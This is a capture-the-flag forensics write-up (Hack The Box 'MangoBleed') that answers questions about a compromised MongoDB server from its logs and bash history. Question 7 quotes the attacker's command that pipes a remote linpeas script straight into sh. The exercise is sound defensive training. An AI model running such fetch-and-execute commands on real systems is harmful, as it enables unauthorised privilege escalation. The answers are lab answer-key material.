# MangoBleed Writeup

01 `<sup>`st `</sup>` January 2026

Prepared by: [CyberJunkie](https://app.hackthebox.com/users/468989)

Solved By: Leviii

Difficulty: `<font color="Green">`Very Easy `</font>`

Sherlock Link:

[![MangoBleed](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/challenges/af21d0c97db2e27e13572cbf59eb343d.png)](https://app.hackthebox.com/sherlocks/MangoBleed?tab=play_sherlock)

## Scenario

You were contacted early this morning to handle a high-priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

## Artifacts Provided

- MangoBleed.zip → 241D52E434F89260628CA3F452E766EB4B0BA4AC3A51D349670BEC414896396A [SHA256]

## Investigation Questions & Findings

### Question 1: What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

The MongoDB vulnerability discussed in the scenario is known as **MongoBleed**, which allows unauthorized memory exposure from affected MongoDB instances.

The designated CVE ID for this vulnerability is **CVE-2025-14847**.

![MangoBleed Task 1](/assets/images/MangoBleed/MangoBleed_Task_1.png)

---

### Question 2: What is the version of MongoDB installed on the server that the CVE exploited?

The version of MongoDB installed on the server was **v8.0.16**.

This information was obtained from the `/var/lib/dpkg/status` file.

![MangoBleed Task 2](/assets/images/MangoBleed/MangoBleed_Task_2.png)

---

### Question 3: Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

The attacker exploited the vulnerability from the remote IP address **65.0.76.43**.

This was identified by reviewing `NETWORK` log entries in `/var/log/mongodb/mongod.log`, which showed accepted incoming connections from this IP.

![MangoBleed Task 3](/assets/images/MangoBleed/MangoBleed_Task_3.png)

---

### Question 4: Based on the MongoDB logs, determine the exact date and time the attacker's exploitation activity began.

The earliest confirmed malicious activity occurred on **2025-12-29 at 05:25:52**.

This timestamp corresponds to the first accepted connection entry associated with the attacker's IP in the MongoDB logs.

![MangoBleed Task 4](/assets/images/MangoBleed/MangoBleed_Task_4.png)

---

### Question 5: Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

The total number of malicious connections was determined by filtering MongoDB logs for the attacker's IP address **65.0.76.43**.

The following PowerShell command was used to count the matching log entries:

```powershell
(Select-String -Path "mongod.log" -Pattern "65.0.76.43").Count
```

![MangoBleed Task 5](/assets/images/MangoBleed/MangoBleed_Task_5.png)

---

### Question 6: When did the attacker successfully gain interactive hands-on remote access?

The attacker successfully gained interactive remote access on **2025-12-29 at 05:40:03**.

This was confirmed from `/var/log/auth.log`, which recorded a successful login using keyboard-interactive authentication for the `mongoadmin` user.

![ManogBleed Task 6](/assets/images/MangoBleed/MangoBleed_Task_6.png)

---

### Question 7: Identify the exact command line used to execute an in-memory script during privilege escalation.

The attacker executed an in-memory enumeration script using the command:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

This was found in `/home/mongoadmin/.bash_history`.

![MongoBleed Task 7](/assets/images/MangoBleed/MangoBleed_Task_7.png)

---

### Question 8: Which directory was targeted for potential data exfiltration?

The attacker focused on the **/var/lib/mongodb** directory.

Bash history shows the attacker navigating to this directory and starting a Python HTTP server, indicating potential data exfiltration activity.

![MangoBleed Task 8](/assets/images/MangoBleed/MangoBleed_Task_8.png)

---

## Tools Used

- **VS Code** for searching and filtering through log and history files
- **PowerShell** commands for counting log entries and analyzing connections

---
